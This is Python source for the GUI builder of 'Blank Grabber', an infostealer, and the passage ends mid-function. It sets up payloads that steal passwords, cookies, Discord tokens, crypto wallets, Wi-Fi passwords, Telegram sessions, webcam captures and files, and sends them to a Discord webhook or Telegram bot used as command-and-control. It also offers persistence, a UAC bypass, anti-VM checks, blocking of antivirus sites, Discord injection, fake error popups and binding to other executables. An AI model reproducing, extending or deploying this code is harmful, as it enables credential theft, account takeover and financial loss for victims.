import os
import subprocess
import sys
import json
import ctypes
import shutil
import ast
import webbrowser
import random
import string

import customtkinter as ctk
from tkinter import messagebox, filedialog
from pkg_resources import parse_version
from socket import create_connection
from tkinter import messagebox
from urllib3 import PoolManager, disable_warnings
disable_warnings()
from urllib.parse import quote
from PIL import Image
from io import BytesIO
from threading import Thread

class Settings:
	UpdatesCheck = True
	Password = "blank123"

class Utility:

	@staticmethod
	def ToggleConsole(choice: bool) -> None:
		if choice:
			# Show Console
			ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 4)
		else:
			# Hide Console
			ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

	@staticmethod
	def IsAdmin() -> bool:
		try:
			return ctypes.windll.shell32.IsUserAnAdmin() == 1
		except Exception:
			return False
		
	@staticmethod
	def GetSelfDir() -> str:
		return os.path.dirname(__file__)
	
	@staticmethod
	def CheckInternetConnection() -> bool:
		try:
			create_connection(("www.google.com", 80), timeout= 3.0)
			return True
		except Exception:
			return False
	
	@staticmethod
	def CheckForUpdates() -> bool:
		if Settings.UpdatesCheck:
			print("Checking for updates...")
			hashFilePath = os.path.join(os.path.dirname(__file__), "Extras", "hash")
			if os.path.isfile(hashFilePath):
				with open(hashFilePath, "r") as f:
					content = f.read()
			
				try:
					http = PoolManager(cert_reqs="CERT_NONE")
					_hash = json.loads(content)["hash"]
					newhash = json.loads(http.request("GET", "https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/Blank%20Grabber/Extras/hash", timeout= 5).data.decode())["hash"]

					os.system("cls")
					return _hash != newhash # New update available
				except Exception:
					pass
			os.system("cls")
		return False
	
	@staticmethod
	def CheckConfiguration() -> None:
		configFile = os.path.join(os.path.dirname(__file__), "config.json")
		password = Settings.Password
		updatesCheck = Settings.UpdatesCheck

		if os.path.isfile(configFile):
			with open(configFile, "r") as file:
				config = json.load(file)
				password = config.get("Password", password)
				updatesCheck = config.get("Check for updates", updatesCheck)
		else:
			updatesCheck = not input("Do you want to regularly check for updates? [Y (default)/N]: ").lower().startswith("n")
			_password = input("Enter a new password for the archive (default: %r): " % Settings.Password).strip()
			if _password:
				password = _password
			
		with open(configFile, "w") as file:
			json.dump({
				"Password" : password,
				"Check for updates" : updatesCheck
			}, file, indent= 4, sort_keys= True)
		
		Settings.Password = password
		Settings.UpdatesCheck = updatesCheck

class BuilderOptionsFrame(ctk.CTkFrame):

	def __init__(self, master) -> None:
		super().__init__(master, fg_color= "transparent")

		self.fakeErrorData = [False, ("", "", 0)] # (Title, Message, Icon)
		self.pumpLimit = 0 # Bytes

		self.grid_propagate(False)

		self.font = ctk.CTkFont(size= 20)

		self.pingMeVar = ctk.BooleanVar(self)
		self.vmProtectVar = ctk.BooleanVar(self)
		self.startupVar = ctk.BooleanVar(self)
		self.meltVar = ctk.BooleanVar(self)
		self.fakeErrorVar = ctk.BooleanVar(self)
		self.blockAvSitesVar = ctk.BooleanVar(self)
		self.discordInjectionVar = ctk.BooleanVar(self)
		self.uacBypassVar = ctk.BooleanVar(self)
		self.pumpStubVar = ctk.BooleanVar(self)

		self.captureWebcamVar = ctk.BooleanVar(self)
		self.capturePasswordsVar = ctk.BooleanVar(self)
		self.captureCookiesVar = ctk.BooleanVar(self)
		self.captureHistoryVar = ctk.BooleanVar(self)
		self.captureAutofillsVar = ctk.BooleanVar(self)
		self.captureDiscordTokensVar = ctk.BooleanVar(self)
		self.captureGamesVar = ctk.BooleanVar(self)
		self.captureWifiPasswordsVar = ctk.BooleanVar(self)
		self.captureSystemInfoVar = ctk.BooleanVar(self)
		self.captureScreenshotVar = ctk.BooleanVar(self)
		self.captureTelegramVar = ctk.BooleanVar(self)
		self.captureCommonFilesVar = ctk.BooleanVar(self)
		self.captureWalletsVar = ctk.BooleanVar(self)
		
		self.boundExePath = ""
		self.boundExeRunOnStartup = False
		self.iconBytes = ""

		self.OutputAsExe = True
		self.ConsoleMode = 0 # 0 = None, 1 = Force, 2 = Debug
		self.C2Mode = 0 # 0 = Discord, 1 = Telegram

		for i in range(7): # Set 7 rows
			self.rowconfigure(i, weight= 1)
		
		for i in range(6): # Set 6 columns
			self.columnconfigure(i, weight= 1)

		# Controls

		self.C2EntryControl = ctk.CTkEntry(self, placeholder_text= "Enter Webhook Here", height= 38, font= self.font, text_color= "white")
		self.C2EntryControl.grid(row= 0, column= 0, sticky= "ew", padx= (15, 5), columnspan= 5)

		self.testC2ButtonControl = ctk.CTkButton(self, text= "Test Webhook", height= 38, font= self.font, fg_color= "#454545", hover_color= "#4D4D4D", text_color_disabled= "grey", command= lambda: Thread(target= self.testC2ButtonControl_Callback).start())
		self.testC2ButtonControl.grid(row= 0, column= 5, sticky= "ew", padx = (5, 15))
		
		self.pingMeCheckboxControl = ctk.CTkCheckBox(self, text= "Ping Me", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.pingMeVar)
		self.pingMeCheckboxControl.grid(row= 1, column= 0, sticky= "w", padx= 20)

		self.vmProtectCheckboxControl = ctk.CTkCheckBox(self, text= "Anti VM", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.vmProtectVar)
		self.vmProtectCheckboxControl.grid(row= 2, column= 0, sticky= "w", padx= 20)

		self.startupCheckboxControl = ctk.CTkCheckBox(self, text= "Put On Startup", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.startupVar)
		self.startupCheckboxControl.grid(row= 3, column= 0, sticky= "w", padx= 20)

		self.meltCheckboxControl = ctk.CTkCheckBox(self, text= "Melt Stub", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.meltVar)
		self.meltCheckboxControl.grid(row= 4, column= 0, sticky= "w", padx= 20)

		self.pumpStubCheckboxControl = ctk.CTkCheckBox(self, text= "Pump Stub", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", command= self.pumpStub_Event, variable= self.pumpStubVar)
		self.pumpStubCheckboxControl.grid(row= 5, column= 0, sticky= "w", padx= 20)

		self.captureWebcamCheckboxControl = ctk.CTkCheckBox(self, text= "Webcam", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureWebcamVar)
		self.captureWebcamCheckboxControl.grid(row= 1, column= 1, sticky= "w", padx= 20)

		self.capturePasswordsCheckboxControl = ctk.CTkCheckBox(self, text= "Passwords", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.capturePasswordsVar)
		self.capturePasswordsCheckboxControl.grid(row= 2, column= 1, sticky= "w", padx= 20)

		self.captureCookiesCheckboxControl = ctk.CTkCheckBox(self, text= "Cookies", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureCookiesVar)
		self.captureCookiesCheckboxControl.grid(row= 3, column= 1, sticky= "w", padx= 20)

		self.captureHistoryCheckboxControl = ctk.CTkCheckBox(self, text= "History", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureHistoryVar)
		self.captureHistoryCheckboxControl.grid(row= 4, column= 1, sticky= "w", padx= 20)

		self.captureHistoryCheckboxControl = ctk.CTkCheckBox(self, text= "Autofills", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureAutofillsVar)
		self.captureHistoryCheckboxControl.grid(row= 5, column= 1, sticky= "w", padx= 20)

		self.captureDiscordTokensCheckboxControl = ctk.CTkCheckBox(self, text= "Discord Tokens", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureDiscordTokensVar)
		self.captureDiscordTokensCheckboxControl.grid(row= 1, column= 2, sticky= "w", padx= 20)

		self.captureGamesCheckboxControl = ctk.CTkCheckBox(self, text= "Games", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureGamesVar)
		self.captureGamesCheckboxControl.grid(row= 2, column= 2, sticky= "w", padx= 20)

		self.captureWalletsCheckboxControl = ctk.CTkCheckBox(self, text= "Wallets", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureWalletsVar)
		self.captureWalletsCheckboxControl.grid(row= 3, column= 2, sticky= "w", padx= 20)

		self.captureWifiPasswordsCheckboxControl = ctk.CTkCheckBox(self, text= "Wifi Passwords", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureWifiPasswordsVar)
		self.captureWifiPasswordsCheckboxControl.grid(row= 4, column= 2, sticky= "w", padx= 20)

		self.captureSysteminfoCheckboxControl = ctk.CTkCheckBox(self, text= "System Info", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureSystemInfoVar)
		self.captureSysteminfoCheckboxControl.grid(row= 1, column= 3, sticky= "w", padx= 20)

		self.captureScreenshotCheckboxControl = ctk.CTkCheckBox(self, text= "Screenshot", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureScreenshotVar)
		self.captureScreenshotCheckboxControl.grid(row= 2, column= 3, sticky= "w", padx= 20)

		self.captureTelegramChecboxControl = ctk.CTkCheckBox(self, text= "Telegram", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureTelegramVar)
		self.captureTelegramChecboxControl.grid(row= 3, column= 3, sticky= "w", padx= 20)

		self.captureCommonFilesChecboxControl = ctk.CTkCheckBox(self, text= "Common Files", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureCommonFilesVar)
		self.captureCommonFilesChecboxControl.grid(row= 4, column= 3, sticky= "w", padx= 20)

		self.fakeErrorCheckboxControl = ctk.CTkCheckBox(self, text= "Fake Error", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", command= self.fakeError_Event, variable= self.fakeErrorVar)
		self.fakeErrorCheckboxControl.grid(row= 1, column= 4, sticky= "w", padx= 20)

		self.blockAvSitesCheckboxControl = ctk.CTkCheckBox(self, text= "Block AV Sites", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.blockAvSitesVar)
		self.blockAvSitesCheckboxControl.grid(row= 2, column= 4, sticky= "w", padx= 20)

		self.discordInjectionCheckboxControl = ctk.CTkCheckBox(self, text= "Discord Injection", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.discordInjectionVar)
		self.discordInjectionCheckboxControl.grid(row= 3, column= 4, sticky= "w", padx= 20)

		self.uacBypassCheckboxControl = ctk.CTkCheckBox(self, text= "UAC Bypass", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.uacBypassVar)
		self.uacBypassCheckboxControl.grid(row= 4, column= 4, sticky= "w", padx= 20)

		self.C2ModeButtonControl = ctk.CTkButton(self, text= "C2: Discord", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.C2ModeButtonControl_Callback)
		self.C2ModeButtonControl.grid(row= 1, column= 5, sticky= "ew", padx= (0, 15))

		self.bindExeButtonControl = ctk.CTkButton(self, text= "Bind Executable", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.bindExeButtonControl_Callback)
		self.bindExeButtonControl.grid(row= 2, column= 5, sticky= "ew", padx= (0, 15))

		self.selectIconButtonControl = ctk.CTkButton(self, text= "Select Icon", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.selectIconButtonControl_Callback)
		self.selectIconButtonControl.grid(row= 3, column= 5, sticky= "ew", padx= (0, 15))

		self.buildModeButtonControl = ctk.CTkButton(self, text= "Output: EXE File", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.buildModeButtonControl_Callback)
		self.buildModeButtonControl.grid(row= 4, column= 5, sticky= "ew", padx= (0, 15))

		self.consoleModeButtonControl = ctk.CTkButton(self, text= "Console: None", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.consoleModeButtonControl_Callback)
		self.consoleModeButtonControl.grid(row= 5, column= 5, sticky= "ew", padx= (0, 15))

		self.buildButtonControl = ctk.CTkButton(self, text= "Build", height= 38, font= self.font, fg_color= "#1E5128", hover_color= "#4E9F3D", text_color_disabled= "grey", command= self.buildButtonControl_Callback)
		self.buildButtonControl.grid(row= 6, column= 5, sticky= "ew", padx= (0, 15))

	def C2ModeButtonControl_Callback(self) -> None:
		self.focus() # Removes focus from the C2 text box
		DISCORD = "C2: Discord"
		TELEGRAM = "C2: Telegram"

		discordOnlyCheckBoxes = (
			(self.pingMeCheckboxControl, self.pingMeVar),
			(self.discordInjectionCheckboxControl, self.discordInjectionVar)
		)

		if self.C2Mode == 0: # Change to Telegram
			self.C2Mode = 1
			buttonText = TELEGRAM
			self.C2EntryControl.configure(placeholder_text= "Enter Telegram Endpoint: [Telegram Bot Token]$[Telegram Chat ID]")
			self.testC2ButtonControl.configure(text= "Test Endpoint")

			for control, var in discordOnlyCheckBoxes:
				control.configure(state= "disabled")
				var.set(False)

		elif self.C2Mode == 1: # Change to Discord
			self.C2Mode = 0
			buttonText = DISCORD
			self.C2EntryControl.configure(placeholder_text= "Enter Discord Webhook URL")
			self.testC2ButtonControl.configure(text= "Test Webhook")

			for control, _ in discordOnlyCheckBoxes:
				control.configure(state= "normal")

		self.C2ModeButtonControl.configure(text= buttonText)
	
	def bindExeButtonControl_Callback(self) -> None:
		UNBIND = "Unbind Executable"
		BIND = "Bind Executable"

		buttonText = self.bindExeButtonControl.cget("text")

		if buttonText == BIND:
			allowedFiletypes = (("Executable file", "*.exe"),)
			filePath = ctk.filedialog.askopenfilename(title= "Select file to bind", initialdir= ".", filetypes= allowedFiletypes)
			if os.path.isfile(filePath):
				self.boundExePath = filePath
				self.bindExeButtonControl.configure(text= UNBIND)
				if messagebox.askyesno("Bind Executable", "Do you want this bound executable to run on startup as well? (Only works if `Put On Startup` option is enabled)"):
					self.boundExeRunOnStartup = True
		
		elif buttonText == UNBIND:
			self.boundExePath = ""
			self.boundExeRunOnStartup = False
			self.bindExeButtonControl.configure(text= BIND)
	
	def selectIconButtonControl_Callback(self) -> None:
		UNSELECT = "Unselect Icon"
		SELECT = "Select Icon"

		buttonText = self.selectIconButtonControl.cget("text")

		if buttonText == SELECT:
			allowedFiletypes = (("Image", ["*.ico", "*.bmp", "*.gif", "*.jpeg", "*.png", "*.tiff", "*.webp"]), ("Any file", "*"))
			filePath = ctk.filedialog.askopenfilename(title= "Select icon", initialdir= ".", filetypes= allowedFiletypes)
			if os.path.isfile(filePath):
				try:
					buffer = BytesIO()
					with Image.open(filePath) as image:
						image.save(buffer, format= "ico")

					self.iconBytes = buffer.getvalue()
				except Exception:
					messagebox.showerror("Error", "Unable to convert the image to icon!")
				else:
					self.selectIconButtonControl.configure(text= UNSELECT)
		
		elif buttonText == UNSELECT:
			self.iconBytes = b""
			self.selectIconButtonControl.configure(text= SELECT)
	
	def buildModeButtonControl_Callback(self) -> None:
		EXEMODE = "Output: EXE File"
		PYMODE = "Output:   PY File"

		exeOnlyChecboxControls = (
			(self.fakeErrorCheckboxControl, self.fakeErrorVar),
			(self.startupCheckboxControl, self.startupVar),
			(self.uacBypassCheckboxControl, self.uacBypassVar),
			(self.pumpStubCheckboxControl, self.pumpStubVar),
			(self.bindExeButtonControl, None),
			(self.selectIconButtonControl, None),
		)

		if self.OutputAsExe: # Change to PY mode
			self.OutputAsExe = False
			buttonText = PYMODE

			for control, var in exeOnlyChecboxControls:
				control.configure(state= "disabled")
				if var:
					var.set(False)
			self.fakeError_Event()
			
			if self.iconBytes:
				self.selectIconButtonControl_Callback() # Remove icon
			
			if self.boundExePath:
				self.bindExeButtonControl_Callback() # Remove bound executable

		else: # Change to EXE mode
			self.OutputAsExe = True
			buttonText = EXEMODE

			for control, _ in exeOnlyChecboxControls:
				control.configure(state= "normal")

		self.buildModeButtonControl.configure(text= buttonText)
	
	def consoleModeButtonControl_Callback(self) -> None:
		CONSOLE_NONE = "Console: None"
		CONSOLE_FORCE = "Console: Force"
		CONSOLE_DEBUG = "Console: Debug"

		if self.ConsoleMode == 0:
			self.ConsoleMode = 1
			buttonText = CONSOLE_FORCE
		elif self.ConsoleMode == 1:
			self.ConsoleMode = 2
			buttonText = CONSOLE_DEBUG
		else:
			self.ConsoleMode = 0
			buttonText = CONSOLE_NONE

		self.consoleModeButtonControl.configure(text= buttonText)
	
	def buildButtonControl_Callback(self) -> None:
		if self.C2Mode == 0:
			webhook = self.C2EntryControl.get().strip()
			if len(webhook) == 0:
				messagebox.showerror("Error", "Webhook cannot be empty!")
				return
			
			if any(char.isspace() for char in webhook):
				messagebox.showerror("Error", "Webhook cannot contain spaces!")
				return
			
			if not webhook.startswith(("http://", "https://")):
				messagebox.showerror("Error", "Invalid protocol for the webhook URL! It must start with either 'http://' or 'https://'.")
				return
		
		elif self.C2Mode == 1:
			endpoint = self.C2EntryControl.get().strip()
			if len(endpoint) == 0:
					messagebox.showerror("Error", "Endpoint cannot be empty!")
					return

			if any(char.isspace() for char in endpoint):
				messagebox.showerror("Error", "Endpoint cannot contain spaces!")
				return
			
			if any(char in ("[", "]") for char in endpoint):
				messagebox.showerror("Error", "You do not have to include the brackets in the endpoint!")
				return

			if not endpoint.count("$") == 1:
				messagebox.showerror("Error", "Invalid format! Endpoint must be your Telegram bot token and chat ID separated by a single '$' symbol.")
				return
			
			token, chat_id = [i.strip() for i in endpoint.split("$")]

			if not token:
				messagebox.showerror("Error", "Bot token cannot be empty!")
				return
			
			if chat_id:
				if not chat_id.lstrip("-").isdigit() and chat_id.count("-") <= 1:
					messagebox.showerror("Error", "Invalid chat ID! Chat ID must be a number.")
					return
			else:
				messagebox.showerror("Error", "Chat ID cannot be empty!")
				return
		
		if not Utility.CheckInternetConnection():
			messagebox.showwarning("Warning", "Unable to connect to the internet!")
			return
		
		if not any([
			self.captureWebcamVar.get(), self.capturePasswordsVar.get(), self.captureCookiesVar.get(), 
	      	self.captureHistoryVar.get(), self.captureDiscordTokensVar.get(), self.captureGamesVar.get(), 
			self.captureWalletsVar.get(), self.captureWifiPasswordsVar.get(), self.captureSystemInfoVar.get(), 
			self.captureScreenshotVar.get(), self.captureTelegramVar.get(), self.captureCommonFilesVar.get(),
			self.captureAutofillsVar.get(),
			]):
			messagebox.showwarning("Warning", "You must select at least one of the stealer modules!")
			return
		
		config= {
    		"settings" : {
        		"c2" : [self.C2Mode, self.C2EntryControl.get().strip()],
				"mutex" : "".join(random.choices(string.ascii_letters + string.digits, k= 16)),
        		"pingme" : self.pingMeVar.get(),
        		"vmprotect" : self.vmProtectVar.get(),
        		"startup" : self.startupVar.get(),
        		"melt" : self.meltVar.get(),
				"uacBypass" : self.uacBypassVar.get(),
				"archivePassword" : Settings.Password,
				"consoleMode" : self.ConsoleMode,
				"debug" : self.ConsoleMode == 2,
				"pumpedStubSize" : self.pumpLimit,
				"boundFileRunOnStartup" : self.boundExeRunOnStartup,
    		},
    
    		"modules" : {
        		"captureWebcam" : self.captureWebcamVar.get(),
        		"capturePasswords" : self.capturePasswordsVar.get(),
        		"captureCookies" : self.captureCookiesVar.get(),
        		"captureHistory" : self.captureHistoryVar.get(),
				"captureAutofills" : self.captureAutofillsVar.get(),
        		"captureDiscordTokens" : self.captureDiscordTokensVar.get(),
				"captureGames" : self.captureGamesVar.get(),
        		"captureWifiPasswords" : self.captureWifiPasswordsVar.get(),
        		"captureSystemInfo" : self.captureSystemInfoVar.get(),
        		"captureScreenshot" : self.captureScreenshotVar.get(),
        		"captureTelegramSession" : self.captureTelegramVar.get(),
				"captureCommonFiles" : self.captureCommonFilesVar.get(),
				"captureWallets" : self.captureWalletsVar.get(),

        		"fakeError" : self.fakeErrorData,
        		"blockAvSites" : self.blockAvSitesVar.get(),
        		"discordInjection" : self.discordInjectionVar.get()
    		}
		}

		configData = json.dumps(config, indent= 4)

		if self.OutputAsExe:
			self.master.BuildExecutable(configData, self.iconBytes, self.boundExePath)
		else:
			self.master.BuildPythonFile(configData)
			
	def testC2ButtonControl_Callback(self) -> None:
		self.C2EntryControl.configure(state= "disabled")
		self.C2ModeButtonControl.configure(state= "disabled")
		self.buildButtonControl.configure(state= "disabled")

		def check():
			http = PoolManager(cert_reqs="CERT_NONE")
			if self.C2Mode == 0:
				webhook = self.C2EntryControl.get().strip()
				if len(webhook) == 0:
					messagebox.showerror("Error", "Webhook cannot be empty!")
					return
				
				if any(char.isspace() for char in webhook):
					messagebox.showerror("Error", "Webhook cannot contain spaces!")
					return
				
				if not webhook.startswith(("http://", "https://")):
					messagebox.showerror("Error", "Invalid protocol for the webhook URL! It must start with either 'http://' or 'https://'.")
					return
				
				elif not "discord" in webhook:
					messagebox.showwarning("Warning", "Webhook does not seems to be a Discord webhook!")
					return
				
				elif not Utility.CheckInternetConnection():
					messagebox.showwarning("Warning", "Unable to connect to the internet!")
					return
				

				try:
					data = json.dumps({"content" : "Your webhook is working!"}).encode()
					http = http.request("POST", webhook, body= data, headers= {"Content-Type" : "application/json", "user-agent" : "Mozilla/5.0 (Linux; Android 10; SM-T510 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Safari/537.36"})
					status = http.status
					if status == 204:
						messagebox.showinfo("Success", "Your webhook seems to be working!")
					else:
						messagebox.showwarning("Warning", "Your webhook does not seems to be working!")
				except Exception:
					messagebox.showwarning("Warning", "Unable to connect to the webhook!")
			
			elif self.C2Mode == 1:
				endpoint = self.C2EntryControl.get().strip()
				if len(endpoint) == 0:
					messagebox.showerror("Error", "Endpoint cannot be empty!")
					return

				if any(char.isspace() for char in endpoint):
					messagebox.showerror("Error", "Endpoint cannot contain spaces!")
					return
				
				if any(char in ("[", "]") for char in endpoint):
					messagebox.showerror("Error", "You do not have to include the brackets in the endpoint!")
					return

				if not endpoint.count("$") == 1:
					messagebox.showerror("Error", "Invalid format! Endpoint must be your Telegram bot token and chat ID separated by a single '$' symbol.")
					return
				
				token, chat_id = [i.strip() for i in endpoint.split("$")]

				if token:
					try:
						resp = json.loads(http.request("GET", "https://api.telegram.org/bot%s/getUpdates" % token).data.decode())
						if not resp["ok"]:
							messagebox.showerror("Error", "Invalid bot token!")
							return
					except Exception as e:
						print(e)
						messagebox.showerror("Error", "Unable to connect to the Telegram API!")
						return
				else:
					messagebox.showerror("Error", "Bot token cannot be empty!")
					return
				
				if chat_id:
					if not chat_id.lstrip("-").isdigit() and chat_id.count("-") <= 1:
						messagebox.showerror("Error", "Invalid chat ID! Chat ID must be a number.")
						return
					else:
						try:
							resp = json.loads(http.request("GET", "https://api.telegram.org/bot%s/getChat?chat_id=%s" % (token, chat_id)).data.decode())
							if not resp["ok"]:
								messagebox.showerror("Error", "Invalid chat ID!\n\nCommon fixes:\n\n1) If the chat ID is of a user, then make sure the user have has sent at least one message to the bot.\n2) If the chat ID is of a channel, then make sure you have has sent at least one message in the channel after the bot joined.\n3) If the chat ID is of a group, then make sure the bot is a member of the group.")
								return
							else:
								if resp["result"].get("permissions"):
									if not resp["result"]["permissions"]["can_send_documents"] or not resp["result"]["permissions"]["can_send_messages"]:
										messagebox.showerror("Error", "The bot does not have the required permissions to send files and messages to the chat!")
										return

						except Exception as e:
							print(e)
							messagebox.showerror("Error", "Unable to connect to the Telegram API!")
							return
				else:
					messagebox.showerror("Error", "Chat ID cannot be empty!")
					return
				
				if not Utility.CheckInternetConnection():
					messagebox.showwarning("Warning", "Unable to connect to the internet!")
					return
				
				try:
					http = PoolManager(cert_reqs="CERT_NONE")
					if http.request("GET", "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s" % (token, chat_id, quote("Your endpoint is working!"))).status == 200:
						messagebox.showinfo("Success", "Your endpoint seems to be working!")
						return
				except Exception as e:
					print(e)
					messagebox.showwarning("Warning", "Unable to connect to the endpoint!")
					return
		
		check()
		self.buildButtonControl.configure(state= "normal")
		self.C2ModeButtonControl.configure(state= "normal")
		self.C2EntryControl.configure(state= "normal")
	
	def fakeError_Event(self) -> None:
		if not self.fakeErrorVar.get():
			self.fakeErrorData = [False, ("", "", 0)]
		else:
			fakeErrorBuilder = FakeErrorBuilder(self)
			self.wait_window(fakeErrorBuilder)
			self.fakeErrorVar.set(self.fakeErrorData[0])
	
	def pumpStub_Event(self) -> None:
		if not self.pumpStubVar.get():
			self.pumpLimit = 0
		else:
			pumperSettings = PumperSettings(self)
			self.wait_window(pumperSettings)
			self.pumpStubVar.set(pumperSettings.limit > 0)
			self.pumpLimit = pumperSettings.limit * 1024 * 1024 # Convert to bytes

class PumperSettings(ctk.CTkToplevel):

	def __init__(self, master) -> None:
		super().__init__(master)
		self.title("Blank Grabber [File Pumper]")
		self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
		self.grab_set()
		self.geometry("500x200")
		self.resizable(False, False)
		
		self.limit = 0
		self.limitVar = ctk.StringVar(self, value= str(self.limit))
		self.font = ctk.CTkFont(size= 18)

		self.rowconfigure(0, weight= 1)
		self.rowconfigure(1, weight= 1)
		self.rowconfigure(2, weight= 1)

		self.columnconfigure(0, weight= 1)
		self.columnconfigure(1, weight= 1)
		self.columnconfigure(2, weight= 1)

		noteLabel = ctk.CTkLabel(self, text= "Please specify the pumped output file size (in MB).\n Note: If the size of the stub is already greater than the\n provided size, nothing happens.", font= self.font)
		noteLabel.grid(row= 0, column= 0, columnspan= 3, padx= 10)

		limitEntry = ctk.CTkEntry(self, text_color= "white", textvariable= self.limitVar, font= self.font)
		limitEntry.grid(row= 1, column= 1, padx= 10, pady= 10)
		limitEntry.bind("<KeyRelease>", self.on_limit_change)

		self.okButton = ctk.CTkButton(self, text= "OK", font= self.font, fg_color= "green", hover_color= "light green", text_color_disabled= "white", command= self.ok_Event)
		self.okButton.grid(row= 2, column= 1, padx= 10, pady= 10)

	def ok_Event(self) -> None:
		if self.limitVar.get().isdigit():
			self.limit = int(self.limitVar.get())
			self.destroy()
		else:
			messagebox.showerror("Error", "The size should be a positive number!")
	
	def on_limit_change(self, _):
		limitBoxText = self.limitVar.get()
		if limitBoxText.isdigit():
			self.okButton.configure(state= "normal")
			self.okButton.configure(fg_color= "green")
		else:
			self.okButton.configure(state= "disabled")
			self.okButton.configure(fg_color= "red")
	
class FakeErrorBuilder(ctk.CTkToplevel):

	def __init__(self, master) -> None:
		super().__init__(master)
		self.title("Blank Grabber [Fake Error Builder]")
		self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
		self.grab_set()
		self.geometry("833x563")
		self.resizable(True, False)

		self.master = master
		self.font = ctk.CTkFont(size= 20)

		self.rowconfigure(0, weight= 1)
		self.rowconfigure(1, weight= 1)
		self.rowconfigure(2, weight= 1)
		self.rowconfigure(3, weight= 1)
		self.rowconfigure(4, weight= 1)
		self.rowconfigure(5, weight= 1)
		self.rowconfigure(6, weight= 1)
		self.rowconfigure(7, weight= 1)
		self.rowconfigure(8, weight= 2)

		self.columnconfigure(1, weight= 1)

		self.iconVar = ctk.IntVar(self, value= 0)

		self.titleEntry = ctk.CTkEntry(self, placeholder_text= "Enter title here", height= 35, font= self.font)
		self.titleEntry.grid(row = 0, column= 1, padx= 20, sticky= "ew", columnspan= 2)

		self.messageEntry = ctk.CTkEntry(self, placeholder_text= "Enter message here", height= 35, font= self.font)
		self.messageEntry.grid(row = 1, column= 1, padx= 20, sticky= "ew", columnspan= 2)

		self.iconChoiceSt = ctk.CTkRadioButton(self, text= "Stop", value= 0, variable= self.iconVar, font= self.font)
		self.iconChoiceSt.grid(row= 4, column= 1, sticky= "w", padx= 20)

		self.iconChoiceQn = ctk.CTkRadioButton(self, text= "Question", value= 16, variable= self.iconVar, font= self.font)
		self.iconChoiceQn.grid(row= 5, column= 1, sticky= "w", padx= 20)

		self.iconChoiceWa = ctk.CTkRadioButton(self, text= "Warning", value= 32, variable= self.iconVar, font= self.font)
		self.iconChoiceWa.grid(row= 6, column= 1, sticky= "w", padx= 20)

		self.iconChoiceIn = ctk.CTkRadioButton(self, text= "Information", value= 48, variable= self.iconVar, font= self.font)
		self.iconChoiceIn.grid(row= 7, column= 1, sticky= "w", padx= 20)

		self.testButton = ctk.CTkButton(self, text= "Test", height= 28, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", command= self.testFakeError)
		self.testButton.grid(row= 4, column= 2, padx= 20)

		self.saveButton = ctk.CTkButton(self, text= "Save", height= 28, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", command= self.saveFakeError)
		self.saveButton.grid(row= 5, column= 2, padx= 20)
	
	def testFakeError(self) -> None:
		title= self.titleEntry.get()
		message= self.messageEntry.get()
		icon= self.iconVar.get()

		if title.strip() == "":
			title= "Title"
			self.titleEntry.insert(0, title)
		
		if message.strip() == "":
			message= "Message"
			self.messageEntry.insert(0, message)
		
		cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{}', 0, '{}', {}+16);close()"'''.format(message, title, icon)
		subprocess.Popen(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
	
	def saveFakeError(self) -> None:
		title= self.titleEntry.get().replace("\x22", "\\x22").replace("\x27", "\\x27")
